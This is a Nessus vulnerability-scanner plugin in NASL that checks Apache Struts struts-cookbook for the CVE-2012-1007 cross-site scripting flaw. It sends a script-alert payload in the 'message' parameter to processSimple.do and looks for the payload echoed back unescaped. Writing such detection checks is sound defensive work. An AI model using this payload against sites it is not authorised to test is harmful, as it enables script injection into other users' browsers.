#
# (C) Tenable Network Security, Inc.
#

include("compat.inc");

if (description)
{
  script_id(60093);
  script_version("$Revision: 1.6 $");
  script_cvs_date("$Date: 2015/12/04 17:38:20 $");

  script_cve_id("CVE-2012-1007");
  script_bugtraq_id(51900);
  script_osvdb_id(78992);
  script_xref(name:"EDB-ID", value:"18452");

  script_name(english:"Apache Struts struts-cookbook processSimple.do message Parameter XSS");
  script_summary(english:"Tries to exploit an XSS flaw in Struts-cookbook");

  script_set_attribute(
    attribute:"synopsis",
    value:
"A remote web application is vulnerable to a cross-site scripting
attack."
  );
  script_set_attribute(
    attribute:"description",
    value:
"The remote web server hosts struts-cookbook, a demonstration
application for the Struts framework.  Input passed via the 'message'
parameter to the 'processSimple.do' page is not properly sanitized
before using it to generate dynamic HTML. 

By tricking someone into clicking on a specially crafted link, an
attacker may be able exploit this to inject arbitrary HTML and script
code into a user's browser to be executed within the security context
of the affected site."
  );
  script_set_attribute(attribute:"see_also", value:"http://secpod.org/blog/?p=450");
  # http://secpod.org/advisories/SecPod_Apache_Struts_Multiple_Parsistant_XSS_Vulns.txt
  script_set_attribute(attribute:"see_also", value:"http://www.nessus.org/u?d16eaf1b");
  script_set_attribute(attribute:"solution", value:
"Remove or restrict access to the Struts-cookbook application.");
  script_set_cvss_base_vector("CVSS2#AV:N/AC:M/Au:N/C:N/I:P/A:N");
  script_set_cvss_temporal_vector("CVSS2#E:F/RL:U/RC:ND");
  script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
  script_set_attribute(attribute:"exploit_available", value:"true");
  script_cwe_id(20, 74, 79, 442, 629, 711, 712, 722, 725, 750, 751, 800, 801, 809, 811, 864, 900, 928, 931, 990);

  script_set_attribute(attribute:"vuln_publication_date", value:"2012/02/01");
  script_set_attribute(attribute:"plugin_publication_date", value:"2012/07/23");

  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_set_attribute(attribute:"cpe", value:"cpe:/a:apache:struts");
  script_end_attributes();

  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses : XSS");

  script_copyright(english:"This script is Copyright (C) 2012-2015 Tenable Network Security, Inc.");

  script_dependencies("http_version.nasl", "webmirror.nasl");
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_require_ports("Services/www", 80, 8080);

  exit(0);
}

include("global_settings.inc");
include("http.inc");
include("misc_func.inc");
include("url_func.inc");

port = get_http_port(default:8080);

# Loop through directories.
dirs = list_uniq(make_list("/struts-cookbook", cgi_dirs()));
if (thorough_tests) 
{
  struts_1x_versions = make_list("1.3.10","1.3.8","1.3.5","1.2.9","1.2.8","1.2.7","1.2.4", "1.1", "1.0.2");

  foreach ver (struts_1x_versions)
    dirs = list_uniq(make_list(dirs, "/struts-cookbook-" + ver));
}

xss_string = "<script>alert('" + SCRIPT_NAME + '_' + rand_str() + "');</script>";

attack_page = "/processSimple.do";
verify_page = "/processSimple.do";

report_requests = make_list();
foreach dir (dirs)
{
  verify_url = dir + verify_page;
  res = http_send_recv3(method:"GET", 
                        port:port, 
                        item:verify_url, 
                        exit_on_fail:TRUE);

  if (
    "<title>Simple form using ActionForm</title>" >< res[2] && 
    'processSimple.do' >< res[2]
  )
  {
    postdata =
      "name=nessus&" +
      "secret=nessus&" +
      "message=" + xss_string;
 
    attack_url = dir + attack_page;

    headers = make_array("Content-Type", "application/x-www-form-urlencoded");

    res = http_send_recv3(method:"POST", 
                    port:port, 
                    item:attack_url, 
                    add_headers:headers,
                    data:postdata, 
                    exit_on_fail:TRUE);
  
    if ('>' + xss_string + '<' >< res[2])
    { 
      report_requests = make_list(report_requests, http_last_sent_request());
      output = strstr(res[2], xss_string);
      if (!thorough_tests) break;
    } 
  }
}

if (max_index(report_requests) > 0)
{
  security_report_v4(
    port       : port,
    severity   : SECURITY_WARNING,
    generic    : TRUE,
    line_limit : 5,
    xss        : TRUE,  # Sets XSS KB key
    request    : report_requests,
    output     : chomp(output)
  );
  exit(0);
}
else exit(0, 'No vulnerable applications were detected on the web server listening on port '+port+'.');
